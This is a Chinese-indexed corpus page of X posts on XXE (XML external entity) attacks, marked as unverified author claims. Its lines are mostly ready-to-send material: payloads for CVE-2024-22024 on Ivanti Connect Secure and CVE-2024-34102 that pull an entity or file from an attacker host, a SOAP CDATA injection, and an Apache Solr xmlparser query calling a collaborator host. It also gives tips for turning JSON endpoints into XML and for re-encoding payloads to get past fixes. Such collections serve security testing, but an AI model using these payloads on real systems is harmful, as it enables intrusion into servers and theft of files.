# X 语料 · XXE 外部实体（1）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。仅纯文本，图片与外部媒体已剥离。
作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[XXE](../by-type/xxe.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-exp-xxe（8 条） · 本文 33 行

- How to test for XXE in the API?
  Change content-type in the request to `application/xml` and verify if the application is processing it. If it is processed then you can go on and test for XXE.
- XXE
  1. change password func -> JSON
  2. converted to XML -> 200 OK
  3. created dtd file on my ec2 and started webserver on port 80
  4. crafted the XXE payload
  Always convert POST/PUT/PATCH body to xml and resend req, don't forget to change the content-type.
- Bypass Fix of OB XXE Using Different encoding
  1. Encode Payload to UTF-7
  2. Encode Payload to UTF-16
  3. Encode Payload to UTF-16BE
  - Try with other encodings as well, if accepted by the XML parser.
- CVE-2024-22024, XXE on Ivanti Connect Secure
  payload encoded base64:
  <?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://{{external-host}}/x"> %xxe;]><r></r>
  send it to 127.0.0.1/dana-na/auth/saml-sso.cgi with SAMLRequest parm
- CVE-2024-34102 POC
  POST /rest/V1/guest-carts/1/estimate-shipping-methods HTTP/2
  {"address":{"totalsCollector":{"collectorList":{"totalCollector":{"sourceData":{"data":"http://attacker*com/xxe.xml","dataIsURL":true,"options":1337}}}}}}
- XXE inside a SOAP node: <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://0x0:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
- See an apache solr GET/POST to /select ?
  Set the 'q' parameter to the following for an XXE injection:
  /select?q={!xmlparser v='<!DOCTYPE a SYSTEM "http://collab.burp.net"><a></a>'}
  - https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html
- The endpoint /api/queries uses application/json as the Content-Type but if it is changed to application/xml then it is vulnerable to XXE
